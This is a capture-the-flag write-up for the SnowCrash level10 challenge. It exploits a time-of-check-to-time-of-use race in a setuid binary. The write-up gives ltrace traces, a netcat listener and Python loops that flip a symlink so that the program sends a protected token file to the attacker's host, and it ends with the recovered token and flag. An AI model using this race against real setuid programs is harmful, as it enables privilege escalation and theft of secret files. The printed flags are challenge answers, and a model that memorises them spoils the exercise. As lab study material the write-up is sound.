# LEVEL10

Vulnerability : TOCTOU (Time Of Check to Time Of Use)

ls -la :

```
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

Quelques test de l'éxécutable : 

```
level10@SnowCrash:~$ ltrace ./level10 test test01
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("test", 4)                       = -1
printf("You don't have access to %s\n", "test"You don't have access to test
) = 30
+++ exited (status 30) +++
```

```
level10@SnowCrash:~$ ltrace ./level10 /tmp/hello10 test
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/hello10", 4)                          = 0
printf("Connecting to %s:6969 .. ", "test")        = 27
fflush(0xb7fd1a20Connecting to test:6969 .. )                                 = 0
socket(2, 1, 0)                                    = 3
inet_addr("test")                                  = 0xffffffff
htons(6969, 1, 0, 0, 0)                            = 14619
connect(3, 0xbffff70c, 16, 0, 0)                   = -1
printf("Unable to connect to host %s\n", "test"Unable to connect to host test
)   = 31
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

```
level10@SnowCrash:~$ ltrace ./level10 /tmp/hello10 192.168.56.103
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/hello10", 4)                 = 0
printf("Connecting to %s:6969 .. ", "192.168.56.103") = 37
fflush(0xb7fd1a20Connecting to 192.168.56.103:6969 .. )                        = 0
socket(2, 1, 0)                           = 3
inet_addr("192.168.56.103")               = 0x6738a8c0
htons(6969, 1, 0, 0, 0)                   = 14619
connect(3, 0xbffff70c, 16, 0, 0)          = 0
write(3, ".*( )*.\n", 8)                  = 8
printf("Connected!\nSending file .. "Connected!
)    = 27
fflush(0xb7fd1a20Sending file .. )                        = 0
open("/tmp/hello10", 0, 010)              = 4
read(4, "hello\n", 4096)                  = 6
write(3, "hello\n", 6)                    = 6
puts("wrote file!"wrote file!
)                       = 12
+++ exited (status 12) +++
```

```
level10@SnowCrash:~$ nc -k -l 192.168.56.103 6969
.*( )*.
hello
```

script python : 

```
import os

while True:
	os.system('./level10 /tmp/hello97 192.168.56.103')

import os

while True:
	os.system('ln -fs /tmp/hello95 /tmp/hello97')
	os.system('ln -fs /home/user/level10/token /tmp/hello97')
```

`woupa2yuojeeaaed06riuj63c`

flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

